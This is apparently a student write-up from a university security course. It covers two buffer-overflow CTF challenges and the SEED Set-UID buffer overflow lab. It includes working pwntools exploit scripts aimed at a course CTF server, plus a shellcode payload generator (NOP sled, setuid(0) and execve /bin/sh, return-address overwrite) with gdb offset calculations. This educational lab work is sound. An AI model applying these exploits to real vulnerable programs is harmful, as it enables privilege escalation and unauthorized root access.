# Work performed - Week #5

# CTF

The goal of the week 5 CTFs is to exploit the buffer overflow vulnerability.

## Week 5 - Challenge 1

Looking at the `main.c` program, we realized that even though the `buffer` variable has a capacity of 20 chars, the program is scanning for at most a 28 chars string, which can cause a buffer overflow.

<figure align="center">
  <img src="/images/week5/challenge1_1.png" alt="my alt text"/>
  <figcaption>Figure 1. main.c program.</figcaption>
</figure>

Regarding the file protections, we observe the following:
- **Arch:**     i386-32-little
- **RELRO:**    No RELRO
- **Stack:**    No canary found
- **NX:**       NX disabled
- **PIE:**      No PIE (0x8048000)
- **RWX:**      Has RWX segments

So, we have an x86 (32-bit) architecture (Arch), there's no canary, meaning Stack Guard isn't activated (Stack), we have stack execution permission (NX), and Read, Write and execute permission in certain regions of the memory. Finally, address randomization isn't turned on (PIE), and RELRO protection is also deactivated but in this case, it doesn't matter as it is commonly used as protection against ROP chain attacks.

Knowing that, and having the goal of reading the contents of the `flag.txt` file, we had to change the value of the `meme_file` variable from `mem.txt` to `flag.txt`.

To accomplish that, we used the provided python script and started by filling the 20 initial chars of the `buffer` variable with random data, in this case, with 1's, which gave us 8 chars left to exploit the buffer overflow and overwrite the `meme_file` local variable with the desired value of `flag.txt`.

```python=
#!/usr/bin/python3
from pwn import *

DEBUG = False

if DEBUG:
    r = process('./program')
else:
    r = remote('ctf-fsi.fe.up.pt', 4003)

r.recvuntil(b":")
r.sendline(b"1" * 20 + b"flag.txt")
r.interactive()
```

The following figure illustrates the position of the local variables of the program in the stack after the exploitation:

<figure align="center">
  <img src="/images/week5/challenge1_2.png" alt="my alt text"/>
  <figcaption>Figure 2. main() Stack Frame after the exploit execution</figcaption>
</figure>

Executing the exploit script, we successfully read the contents of the `flag.txt` file, which contains the desired flag.

<figure align="center">
  <img src="/images/week5/challenge1_3.png" alt="my alt text"/>
  <figcaption>Figure 3. Exploit execution</figcaption>
</figure>


## Week 5 - Challenge 2
The second program is slightly more difficult to exploit than the previous one because we first have to set the content of the `var` variable to `0xfefc2122` in order to enter the first `if` inside the code. As in the previous challenge, we then have to overwrite the `meme_file` variable to `flag.txt`.

By using the `file` and `checksec` commands we observe that the file protections kept the same as in the previous executable.

<figure align="center">
  <img src="/images/week5/challenge2_1.png" alt="my alt text"/>
  <figcaption>Figure 4. Checking file protections</figcaption>
</figure>


Answering the utterance questions:
- Which changes were made?
    -  A 4-byte variable `var` was initialized with some content (`"\xef\xbe\xad\xde"`) and an `if` which compares its content to `0xfefc2122` was also added. Therefore, only by entering the `if` we are able to read the contents of the file.
- Do they totally mitigate the problem?
    - As mentioned above, no. We are still able to perform a buffer overflow attack and change the contents of both `var` and `meme_file` and read the `flag.txt` file.
- Is it possible to overcome that mitigation by using a technique similar to the one used before?
    - As you might have guessed from what was already written, yes.

The exploit script was built from the script provided and it basically alters the stack so that it stays as in the following picture:

<figure align="center">
  <img src="/images/week5/challenge2_2.png" alt="my alt text"/>
  <figcaption>Figure 5. main() Stack Frame after the exploit execution</figcaption>
</figure>

The python exploit used was the following:

```python=
#!/usr/bin/python3
from pwn import *

DEBUG = False

if DEBUG:
    r = process('./program')
else:
    r = remote('ctf-fsi.fe.up.pt', 4000)

r.recvuntil(b":")
r.sendline(b"1" * 20 + b"\x22\x21\xfc\xfe" + b"flag.txt")
r.interactive()
```

Notice the change applied in line 12 which is the 32 bytes string used to perform the buffer overflow.

After the script execution, we finally got our flag!

<figure align="center">
  <img src="/images/week5/challenge2_3.png" alt="my alt text"/>
  <figcaption>Figure 6. Getting the flag after exploit execution</figcaption>
</figure>

# SEED Lab Tasks

This week's suggested lab was Buffer Overflow Attack Lab (Set-UID Version), from SEED labs, with the intent of providing us a better understanding of what buffer overflow attacks are and how they can be used.

## Task 1

After briefly taking a look at how shellcode in assembly code looks like, we tried compiling and running the code provided.

When running the code, we noticed that a shell prompt was given, allowing us to execute any shell commands. By looking at the code, we understand that by storing the shellcode in a variable and invoking it as a function call, we can get access to a shell with low privileges. This happens because our shellcode didn't include the line responsible for the `setuid(0)` execution that changes the Effective-UID, Real-UID, and Saved-UID to 0, meaning root. 

<figure align="center">
  <img src="/images/week5/task1_1.png" alt="my alt text"/>
  <figcaption>Figure 7. `call_shellcode.c` program execution</figcaption>
</figure>

Including the aforementioned `setuid(0)` shellcode we get a root shell.

<figure align="center">
  <img src="/images/week5/task1_2.png" alt="my alt text"/>
  <figcaption>Figure 8. `call_shellcode.c` program execution with `setuid(0)`</figcaption>
</figure>

## Task 2

In this task, the code of a program vulnerable to buffer overflow attacks is provided to us, in order to analyze, discover the vulnerability and perform an attack, assuming it is a Set-UID program.

To proceed to the next task and develop an exploit, we first compiled the code as 32-bit (``-m32``) and used ``-DBUF_SIZE=100`` (size of the buffer to overflow will be of 100 bytes), before setting root ownership and enabling the Set-UID bit. We also remove the non-executable stack protections (``-z execstack``) and the StackGuard (``-fno-stack-protector``). 

<figure align="center">
  <img src="/images/week5/task2.png" alt="my alt text"/>
  <figcaption>Figure 9. Compilation of the program.</figcaption>
</figure>


## Task 3

Our objective following the previous task is to be able to run a shell by providing malicious content in a file to the target program and, by doing so, exploiting the buffer overflow vulnerability present. 

In this case, we want to take advantage of the use of the ``strcpy()`` function to copy the content to a buffer that, in this instance, has an allocated size of 100 bytes, while the program reads up to 517 bytes of data from the ``badfile`` file.

This allows us to insert 417 bytes into the stack beyond the 100 bytes of the buffer, and so replace the return address of the `bof` function with an address pointing to the shellcode that will be inserted in the file as well. By doing this, we can execute a shell when running the program.

### Step 1

In order to do an exploit, we need to know the difference between the buffer starting address and where the return address is located. To do this, we execute the program using ``gdb``, so we can retrieve the ``ebp`` address and the buffer address. 

<figure align="center">
  <img src="/images/week5/task3_2.png" alt="my alt text"/>
  <figcaption>Figure 10. Running the program using gdb.</figcaption>
</figure>

<figure align="center">
  <img src="/images/week5/task3_3.png" alt="my alt text"/>
  <figcaption>Figure 11. ebp and buffer addresses.</figcaption>
</figure>

- ``ebp``: **0xffffc998**
- `buffer` starting address: **0xffffc92c**

Now we can calculate the difference (0xffffc998 - 0xffffc92c), which is **108 bytes**.

<figure align="center">
  <img src="/images/week5/task3_4.png" alt="my alt text"/>
  <figcaption>Figure 12. Stack disposition.</figcaption>
</figure>

As we know how the stack frame disposition should be, we now know that the return address is located in the address next to the ebp, so from the start of the `buffer` to the return address, there is a 108+4=**112** bytes difference in the stack.

### Step 2

Having all the needed information, we started making changes to the python exploit script, that is the following:

```python=
#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
  "\x31\xdb\x31\xc0\xb0\xd5\xcd\x80" # setuid(0)
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode somewhere in the payload
start = 517 - len(shellcode)              
content[start:] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0xffffc998 + 8 + 144        
offset = 112              

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```

In the ``shellcode`` variable we inserted the shellcode provided in the first task, using the 32-bit version, including the provided line that enables Set-UID. Then, after filling the content of the payload with NOP's, we put the shellcode at the end of the 517 bytes string. This way, if the return address points to any of the NOP's, the execution will end up in the shellcode we insert either way. So, by having the maximum number of NOP's possible before the shellcode, the chances of successfully exploiting the vulnerability increase and it becomes easier.

As for the ``offset``, we used the previously calculated difference, as we know that the return address will be located 112 bytes ahead in the stack compared to the start of the buffer in which we want to insert the payload.

The ``ret`` (value of the return address) could be calculated by using the ``ebp`` address and adding 8 bytes (so the address can point to after the return address location). Although this works using ``gdb``, when running the program without using the debugging information, the actual addresses become larger as ``gdb`` adds some information into the stack. This is because `gdb` has pushed some environment data into the stack before running the debugged program. When the program runs directly without using `gdb`, the stack does not have those data, so the actual frame pointer value will be larger. More information about this can be found [here](https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it).

<figure align="center">
  <img src="/images/week5/task3_7.png" alt="my alt text"/>
  <figcaption>Figure 13. Stack with and without gdb.</figcaption>
</figure>

So we used this value as a reference and tried to add a larger offset to the return address value, and, in this case, by adding an additional 144 bytes, the exploit worked and we could use the root shell.

<figure align="center">
  <img src="/images/week5/task3_5.png" alt="my alt text"/>
  <figcaption>Figure 14. Running the program with exploit on gdb.</figcaption>
</figure>

> **Note**: we noticed that, when using `gdb`, the shell will not run with root privileges, regardless of the program ownership or Set-UID bit and line in the shellcode. This is because the debugger always requires the same privileges as the program in order to debug it.

<figure align="center">
  <img src="/images/week5/task3_6.png" alt="my alt text"/>
  <figcaption>Figure 15. Running the program with exploit without gdb.</figcaption>
</figure>